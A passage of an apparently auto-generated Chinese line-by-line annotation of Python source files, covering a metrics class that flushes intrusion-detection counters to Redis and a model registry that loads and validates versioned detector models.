| 44 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 45 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 46 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._packets_total += n` |
| 47 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 48 | 函数定义：声明 `record_threat_intel_drops` 的输入、处理逻辑和返回结果。 | `    def record_threat_intel_drops(self, n: int) -> None:` |
| 49 | 条件判断：满足条件时进入对应分支。 | `        if n <= 0:` |
| 50 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 51 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 52 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._packets_dropped += n` |
| 53 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 54 | 函数定义：声明 `record_queue_read_error` 的输入、处理逻辑和返回结果。 | `    def record_queue_read_error(self) -> None:` |
| 55 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 56 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._packets_dropped += 1` |
| 57 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 58 | 函数定义：声明 `record_aggregator_deltas` 的输入、处理逻辑和返回结果。 | `    def record_aggregator_deltas(self, malformed: int, single: int, partial: int) -> None:` |
| 59 | 文档字符串：说明当前模块、类或函数的职责。 | `        """传入本 tick 相对上次的增量（非累计）。"""` |
| 60 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        d = max(0, malformed) + max(0, single) + max(0, partial)` |
| 61 | 条件判断：满足条件时进入对应分支。 | `        if d <= 0:` |
| 62 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 63 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 64 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._packets_dropped += d` |
| 65 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 66 | 函数定义：声明 `record_detection_latency_ms` 的输入、处理逻辑和返回结果。 | `    def record_detection_latency_ms(self, ms: float) -> None:` |
| 67 | 条件判断：满足条件时进入对应分支。 | `        if ms < 0:` |
| 68 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 69 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 70 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._latency_sum_ms += ms` |
| 71 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._latency_count += 1` |
| 72 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 73 | 函数定义：声明 `record_alert` 的输入、处理逻辑和返回结果。 | `    def record_alert(self) -> None:` |
| 74 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 75 | 代码语句：参与当前文件的业务流程或数据处理。 | `            self._alerts_total += 1` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._last_detection_ts = time.time()` |
| 77 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 78 | 函数定义：声明 `set_model_ready_gauge` 的输入、处理逻辑和返回结果。 | `    def set_model_ready_gauge(self, value: int) -> None:` |
| 79 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 80 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._model_ready_gauge = max(0, min(255, int(value)))` |
| 81 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 82 | 函数定义：声明 `set_collection_flags` 的输入、处理逻辑和返回结果。 | `    def set_collection_flags(self, packet: bool, web: bool) -> None:` |
| 83 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 84 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._collection_packet = packet` |
| 85 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._collection_web = web` |
| 86 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 87 | 函数定义：声明 `record_redis_stream_write` 的输入、处理逻辑和返回结果。 | `    def record_redis_stream_write(self, ok: bool) -> None:` |
| 88 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 89 | 条件判断：满足条件时进入对应分支。 | `            if ok:` |
| 90 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self._redis_stream_writes_ok += 1` |
| 91 | 兜底分支：处理前面条件都不满足的情况。 | `            else:` |
| 92 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self._redis_stream_writes_fail += 1` |
| 93 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 94 | 函数定义：声明 `snapshot` 的输入、处理逻辑和返回结果。 | `    def snapshot(self) -> Dict[str, Any]:` |
| 95 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 96 | 返回结果：把处理后的值交回调用方。 | `            return {` |
| 97 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "packets_total": self._packets_total,` |
| 98 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "packets_dropped_total": self._packets_dropped,` |
| 99 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "detection_latency_sum_ms": self._latency_sum_ms,` |
| 100 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "detection_latency_count": self._latency_count,` |
| 101 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "alerts_total": self._alerts_total,` |
| 102 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "model_ready": self._model_ready_gauge,` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "last_detection_ts": self._last_detection_ts,` |
| 104 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "collection_packet": int(self._collection_packet),` |
| 105 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "collection_web": int(self._collection_web),` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "redis_stream_writes_ok": self._redis_stream_writes_ok,` |
| 107 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "redis_stream_writes_fail": self._redis_stream_writes_fail,` |
| 108 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "updated_ts": time.time(),` |
| 109 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 110 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 111 | 函数定义：声明 `flush_to_redis` 的输入、处理逻辑和返回结果。 | `    def flush_to_redis(self, redis_client: Any, min_interval_sec: float = 2.0) -> None:` |
| 112 | 文档字符串：说明当前模块、类或函数的职责。 | `        """写入 Redis；失败仅打 debug，不抛异常。"""` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        now = time.time()` |
| 114 | 上下文管理：自动管理资源打开与释放。 | `        with self._lock:` |
| 115 | 条件判断：满足条件时进入对应分支。 | `            if now - self._last_flush_ts < min_interval_sec:` |
| 116 | 返回结果：把处理后的值交回调用方。 | `                return` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            self._last_flush_ts = now` |
| 118 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            snap = {` |
| 119 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "packets_total": str(self._packets_total),` |
| 120 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "packets_dropped_total": str(self._packets_dropped),` |
| 121 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "detection_latency_sum_ms": str(self._latency_sum_ms),` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "detection_latency_count": str(self._latency_count),` |
| 123 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "alerts_total": str(self._alerts_total),` |
| 124 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "model_ready": str(self._model_ready_gauge),` |
| 125 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "last_detection_ts": str(self._last_detection_ts),` |
| 126 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "collection_packet": str(int(self._collection_packet)),` |
| 127 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "collection_web": str(int(self._collection_web)),` |
| 128 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "redis_stream_writes_ok": str(self._redis_stream_writes_ok),` |
| 129 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "redis_stream_writes_fail": str(self._redis_stream_writes_fail),` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                "updated_ts": str(now),` |
| 131 | 代码语句：参与当前文件的业务流程或数据处理。 | `            }` |
| 132 | 条件判断：满足条件时进入对应分支。 | `        if not getattr(redis_client, "is_available", False):` |
| 133 | 返回结果：把处理后的值交回调用方。 | `            return` |
| 134 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 135 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            rc = redis_client._client  # noqa: SLF001 - 适配层内部；仅运维指标` |
| 136 | 条件判断：满足条件时进入对应分支。 | `            if rc is None:` |
| 137 | 返回结果：把处理后的值交回调用方。 | `                return` |
| 138 | 函数调用：执行已有函数/方法完成当前步骤。 | `            rc.hset(GUARDIAN_METRICS_REDIS_KEY, mapping=snap)` |
| 139 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except Exception as exc:  # noqa: BLE001` |
| 140 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.debug("[GuardianMetrics] flush_to_redis 失败: %s", exc)` |
| 141 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 142 | 函数定义：声明 `write_status_file` 的输入、处理逻辑和返回结果。 | `    def write_status_file(self, path: str) -> None:` |
| 143 | 文档字符串：说明当前模块、类或函数的职责。 | `        """人读 JSON 状态（不含密钥）。"""` |
| 144 | 异常保护：尝试执行可能失败的逻辑。 | `        try:` |
| 145 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            body = {"guardian": self.snapshot(), "schema": "guardian_status_v1"}` |
| 146 | 上下文管理：自动管理资源打开与释放。 | `            with open(path, "w", encoding="utf-8") as f:` |
| 147 | 函数调用：执行已有函数/方法完成当前步骤。 | `                json.dump(body, f, ensure_ascii=False, indent=2)` |
| 148 | 异常处理：捕获错误并执行降级或记录逻辑。 | `        except OSError as exc:` |
| 149 | 日志记录：输出运行状态、调试信息或异常线索。 | `            logger.debug("[GuardianMetrics] status 文件写入失败: %s", exc)` |
| 150 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 151 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 152 | 函数定义：声明 `read_guardian_redis_snapshot` 的输入、处理逻辑和返回结果。 | `def read_guardian_redis_snapshot(redis_client: Any) -> Dict[str, float]:` |
| 153 | 文档字符串：说明当前模块、类或函数的职责。 | `    """Web 侧读取 Guardian 刷入的指标；缺失字段视为 0。"""` |
| 154 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    out: Dict[str, float] = {}` |
| 155 | 条件判断：满足条件时进入对应分支。 | `    if not getattr(redis_client, "is_available", False):` |
| 156 | 返回结果：把处理后的值交回调用方。 | `        return out` |
| 157 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 158 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        rc = redis_client._client  # noqa: SLF001` |
| 159 | 条件判断：满足条件时进入对应分支。 | `        if rc is None:` |
| 160 | 返回结果：把处理后的值交回调用方。 | `            return out` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        raw = rc.hgetall(GUARDIAN_METRICS_REDIS_KEY)` |
| 162 | 循环：逐个处理集合或迭代器中的元素。 | `        for k, v in (raw or {}).items():` |
| 163 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            key = k.decode() if isinstance(k, bytes) else str(k)` |
| 164 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            val = v.decode() if isinstance(v, bytes) else str(v)` |
| 165 | 异常保护：尝试执行可能失败的逻辑。 | `            try:` |
| 166 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                out[key] = float(val)` |
| 167 | 异常处理：捕获错误并执行降级或记录逻辑。 | `            except ValueError:` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                out[key] = 0.0` |
| 169 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception as exc:  # noqa: BLE001` |
| 170 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.debug("[GuardianMetrics] read_guardian_redis_snapshot 失败: %s", exc)` |
| 171 | 返回结果：把处理后的值交回调用方。 | `    return out` |

## `src/registry/__init__.py`

- 类型：模型注册
- 行数：3

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 导入对象：从指定模块引入类、函数或常量。 | `from .model_registry import ModelRegistry` |
| 2 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 3 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `__all__ = ["ModelRegistry"]` |

## `src/registry/model_registry.py`

- 类型：模型注册
- 行数：432

| 行号 | 备注 | 原始代码 |
|---:|---|---|
| 1 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 2 | 代码语句：参与当前文件的业务流程或数据处理。 | `ModelRegistry：版本发现、manifest 校验、原子切换 current、回滚与审计。` |
| 3 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 4 | 代码语句：参与当前文件的业务流程或数据处理。 | `目录约定（磁盘 \`\`models/saved/\`\` 下）::` |
| 5 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 6 | 代码语句：参与当前文件的业务流程或数据处理。 | `    <family>/v1/manifest.json` |
| 7 | 代码语句：参与当前文件的业务流程或数据处理。 | `    <family>/v1/model.pkl` |
| 8 | 代码语句：参与当前文件的业务流程或数据处理。 | `    <family>/current.txt   # 内容为 v1（Windows 无 symlink 时用）` |
| 9 | 代码语句：参与当前文件的业务流程或数据处理。 | `    <family>/current       # 可选 symlink / junction -> v1` |
| 10 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 11 | 代码语句：参与当前文件的业务流程或数据处理。 | `兼容旧式扁平 \`\`ddos_rf_v1.pkl\`\` + \`\`*.model_manifest.json\`\`。` |
| 12 | 文档字符串边界：开始或结束模块/类/函数说明。 | `"""` |
| 13 | 兼容性导入：启用较新的 Python 语义。 | `from __future__ import annotations` |
| 14 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 15 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import logging` |
| 16 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import os` |
| 17 | 导入模块：引入标准库或第三方依赖供后续代码使用。 | `import tempfile` |
| 18 | 导入对象：从指定模块引入类、函数或常量。 | `from typing import TYPE_CHECKING, Callable, Dict, List, Optional, Tuple` |
| 19 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 20 | 导入对象：从指定模块引入类、函数或常量。 | `from src.schema.manifest import (` |
| 21 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ManifestLoadError,` |
| 22 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ModelManifest,` |
| 23 | 代码语句：参与当前文件的业务流程或数据处理。 | `    load_manifest_from_version_dir,` |
| 24 | 函数调用：执行已有函数/方法完成当前步骤。 | `)` |
| 25 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 26 | 条件判断：满足条件时进入对应分支。 | `if TYPE_CHECKING:` |
| 27 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.audit.security_logger import SecurityLogger` |
| 28 | 导入对象：从指定模块引入类、函数或常量。 | `    from src.detectors.base import BaseDetector` |
| 29 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 30 | 日志记录：输出运行状态、调试信息或异常线索。 | `logger = logging.getLogger(__name__)` |
| 31 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 32 | 注释：解释下面或当前这段代码的设计意图。 | `# 无版本子目录时的主模型文件名（相对 model_dir）` |
| 33 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `LEGACY_PRIMARY_FILE: Dict[str, str] = {` |
| 34 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "ddos": "ddos_rf_v1.pkl",` |
| 35 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "intrusion": "intrusion_rf_v1.pkl",` |
| 36 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "web_attack": "web_attack_nb_v1.pkl",` |
| 37 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "anomaly": "anomaly_if_v1.pkl",` |
| 38 | 代码语句：参与当前文件的业务流程或数据处理。 | `}` |
| 39 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 40 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `_EXPECTED: Dict[str, Tuple[str, str]] = {` |
| 41 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "ddos": ("network_flow_v1", "tabular"),` |
| 42 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "intrusion": ("network_flow_v1", "tabular"),` |
| 43 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "web_attack": ("web_request_v1", "text_sklearn_pipeline"),` |
| 44 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    "anomaly": ("network_flow_v1", "tabular"),` |
| 45 | 代码语句：参与当前文件的业务流程或数据处理。 | `}` |
| 46 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 47 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 48 | 函数定义：声明 `_audit` 的输入、处理逻辑和返回结果。 | `def _audit(` |
| 49 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    sink: Optional["SecurityLogger"],` |
| 50 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    action: str,` |
| 51 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `    details: Optional[dict] = None,` |
| 52 | 代码语句：参与当前文件的业务流程或数据处理。 | `) -> None:` |
| 53 | 条件判断：满足条件时进入对应分支。 | `    if sink is None:` |
| 54 | 返回结果：把处理后的值交回调用方。 | `        return` |
| 55 | 异常保护：尝试执行可能失败的逻辑。 | `    try:` |
| 56 | 函数调用：执行已有函数/方法完成当前步骤。 | `        sink.log_model_governance(action, details or {})` |
| 57 | 异常处理：捕获错误并执行降级或记录逻辑。 | `    except Exception as exc:  # noqa: BLE001` |
| 58 | 日志记录：输出运行状态、调试信息或异常线索。 | `        logger.error("[ModelRegistry] 审计写入失败: %s", exc)` |
| 59 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 60 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 61 | 类定义：声明 `ModelRegistry`，封装相关状态与行为。 | `class ModelRegistry:` |
| 62 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 63 | 代码语句：参与当前文件的业务流程或数据处理。 | `    按家族管理模型路径解析、热加载、回滚与治理审计。` |
| 64 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 65 | 代码语句：参与当前文件的业务流程或数据处理。 | `    \`\`try_load_detector\`\` / \`\`promote_version\`\` / \`\`rollback\`\` 在加载失败时` |
| 66 | 代码语句：参与当前文件的业务流程或数据处理。 | `    尽量恢复检测器到先前可用权重。` |
| 67 | 文档字符串边界：开始或结束模块/类/函数说明。 | `    """` |
| 68 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 69 | 函数定义：声明 `__init__` 的输入、处理逻辑和返回结果。 | `    def __init__(` |
| 70 | 代码语句：参与当前文件的业务流程或数据处理。 | `        self,` |
| 71 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        model_dir: str,` |
| 72 | 代码语句：参与当前文件的业务流程或数据处理。 | `        *,` |
| 73 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        audit_sink: Optional["SecurityLogger"] = None,` |
| 74 | 代码语句：参与当前文件的业务流程或数据处理。 | `    ) -> None:` |
| 75 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self.model_dir = os.path.abspath(model_dir)` |
| 76 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._audit_sink = audit_sink` |
| 77 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._last_good_version: Dict[str, str] = {}` |
| 78 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._reload_lock_callbacks: Dict[str, Callable[[], None]] = {}` |
| 79 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 80 | 函数定义：声明 `register_reload_hook` 的输入、处理逻辑和返回结果。 | `    def register_reload_hook(self, family: str, fn: Callable[[], None]) -> None:` |
| 81 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        self._reload_lock_callbacks[family] = fn` |
| 82 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 83 | 函数定义：声明 `family_root` 的输入、处理逻辑和返回结果。 | `    def family_root(self, family: str) -> str:` |
| 84 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._ensure_family(family)` |
| 85 | 返回结果：把处理后的值交回调用方。 | `        return os.path.join(self.model_dir, family)` |
| 86 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 87 | 函数定义：声明 `list_versions` 的输入、处理逻辑和返回结果。 | `    def list_versions(self, family: str) -> List[str]:` |
| 88 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        root = self.family_root(family)` |
| 89 | 条件判断：满足条件时进入对应分支。 | `        if not os.path.isdir(root):` |
| 90 | 返回结果：把处理后的值交回调用方。 | `            return []` |
| 91 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        out: List[str] = []` |
| 92 | 循环：逐个处理集合或迭代器中的元素。 | `        for name in sorted(os.listdir(root)):` |
| 93 | 条件判断：满足条件时进入对应分支。 | `            if name == "current" or name.startswith("."):` |
| 94 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 95 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            vd = os.path.join(root, name)` |
| 96 | 条件判断：满足条件时进入对应分支。 | `            if not os.path.isdir(vd):` |
| 97 | 继续循环：跳过本轮剩余逻辑。 | `                continue` |
| 98 | 条件判断：满足条件时进入对应分支。 | `            if os.path.isfile(os.path.join(vd, "manifest.json")):` |
| 99 | 函数调用：执行已有函数/方法完成当前步骤。 | `                out.append(name)` |
| 100 | 返回结果：把处理后的值交回调用方。 | `        return out` |
| 101 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 102 | 函数定义：声明 `get_current_version_id` 的输入、处理逻辑和返回结果。 | `    def get_current_version_id(self, family: str) -> Optional[str]:` |
| 103 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        root = self.family_root(family)` |
| 104 | 条件判断：满足条件时进入对应分支。 | `        if not os.path.isdir(root):` |
| 105 | 返回结果：把处理后的值交回调用方。 | `            return None` |
| 106 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        cur = self._read_current_marker(root)` |
| 107 | 条件判断：满足条件时进入对应分支。 | `        if cur and os.path.isdir(os.path.join(root, cur)):` |
| 108 | 返回结果：把处理后的值交回调用方。 | `            return cur` |
| 109 | 返回结果：把处理后的值交回调用方。 | `        return cur` |
| 110 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 111 | 函数定义：声明 `resolve_load_path` 的输入、处理逻辑和返回结果。 | `    def resolve_load_path(self, family: str) -> Optional[str]:` |
| 112 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._ensure_family(family)` |
| 113 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        root = self.family_root(family)` |
| 114 | 条件判断：满足条件时进入对应分支。 | `        if os.path.isdir(root):` |
| 115 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            vid = self._read_current_marker(root)` |
| 116 | 条件判断：满足条件时进入对应分支。 | `            if vid:` |
| 117 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                vdir = os.path.join(root, vid)` |
| 118 | 条件判断：满足条件时进入对应分支。 | `                if self._is_valid_version_dir(vdir):` |
| 119 | 返回结果：把处理后的值交回调用方。 | `                    return os.path.abspath(vdir)` |
| 120 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `            vers = self.list_versions(family)` |
| 121 | 条件判断：满足条件时进入对应分支。 | `            if vers:` |
| 122 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                fallback = os.path.join(root, vers[-1])` |
| 123 | 日志记录：输出运行状态、调试信息或异常线索。 | `                logger.warning(` |
| 124 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    "[ModelRegistry] %s 未配置 current，回退到最新版本目录 %s",` |
| 125 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    family,` |
| 126 | 代码语句：参与当前文件的业务流程或数据处理。 | `                    vers[-1],` |
| 127 | 函数调用：执行已有函数/方法完成当前步骤。 | `                )` |
| 128 | 返回结果：把处理后的值交回调用方。 | `                return os.path.abspath(fallback)` |
| 129 | 返回结果：把处理后的值交回调用方。 | `            return None` |
| 130 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        legacy = os.path.join(self.model_dir, LEGACY_PRIMARY_FILE[family])` |
| 131 | 条件判断：满足条件时进入对应分支。 | `        if os.path.isfile(legacy):` |
| 132 | 返回结果：把处理后的值交回调用方。 | `            return os.path.abspath(legacy)` |
| 133 | 返回结果：把处理后的值交回调用方。 | `        return None` |
| 134 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 135 | 函数定义：声明 `validate_manifest_for_family` 的输入、处理逻辑和返回结果。 | `    def validate_manifest_for_family(self, family: str, manifest: ModelManifest) -> None:` |
| 136 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._ensure_family(family)` |
| 137 | 代码语句：参与当前文件的业务流程或数据处理。 | `        expected_schema, expected_mode = _EXPECTED[family]` |
| 138 | 条件判断：满足条件时进入对应分支。 | `        if manifest.schema_name != expected_schema:` |
| 139 | 抛出异常：主动报告不可继续的错误。 | `            raise ManifestLoadError(` |
| 140 | 代码语句：参与当前文件的业务流程或数据处理。 | `                f"家族 {family} 需要 schema_name={expected_schema}，实际={manifest.schema_name}"` |
| 141 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 142 | 条件判断：满足条件时进入对应分支。 | `        if manifest.model_input_mode != expected_mode:` |
| 143 | 抛出异常：主动报告不可继续的错误。 | `            raise ManifestLoadError(` |
| 144 | 代码语句：参与当前文件的业务流程或数据处理。 | `                f"家族 {family} 需要 model_input_mode={expected_mode}，实际={manifest.model_input_mode}"` |
| 145 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 146 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 147 | 函数定义：声明 `try_load_detector` 的输入、处理逻辑和返回结果。 | `    def try_load_detector(self, family: str, detector: "BaseDetector") -> bool:` |
| 148 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        path = self.resolve_load_path(family)` |
| 149 | 条件判断：满足条件时进入对应分支。 | `        if not path:` |
| 150 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _audit(` |
| 151 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self._audit_sink,` |
| 152 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "model_path_missing",` |
| 153 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                {"family": family, "model_dir": self.model_dir},` |
| 154 | 函数调用：执行已有函数/方法完成当前步骤。 | `            )` |
| 155 | 返回结果：把处理后的值交回调用方。 | `            return False` |
| 156 | 返回结果：把处理后的值交回调用方。 | `        return self._load_detector_at(family, detector, path, audit_key="initial_load")` |
| 157 | 空行：分隔代码块，让相邻逻辑更容易阅读。 | `&nbsp;` |
| 158 | 函数定义：声明 `promote_version` 的输入、处理逻辑和返回结果。 | `    def promote_version(self, family: str, version_id: str, detector: "BaseDetector") -> bool:` |
| 159 | 函数调用：执行已有函数/方法完成当前步骤。 | `        self._ensure_family(family)` |
| 160 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        root = self.family_root(family)` |
| 161 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `        vdir = os.path.join(root, version_id)` |
| 162 | 条件判断：满足条件时进入对应分支。 | `        if not self._is_valid_version_dir(vdir):` |
| 163 | 函数调用：执行已有函数/方法完成当前步骤。 | `            _audit(` |
| 164 | 代码语句：参与当前文件的业务流程或数据处理。 | `                self._audit_sink,` |
| 165 | 代码语句：参与当前文件的业务流程或数据处理。 | `                "promote_rejected",` |
| 166 | 代码语句：参与当前文件的业务流程或数据处理。 | `                {` |
| 167 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "family": family,` |
| 168 | 赋值/配置：保存变量、字段或配置项供后续逻辑使用。 | `                    "version": version_id,` |
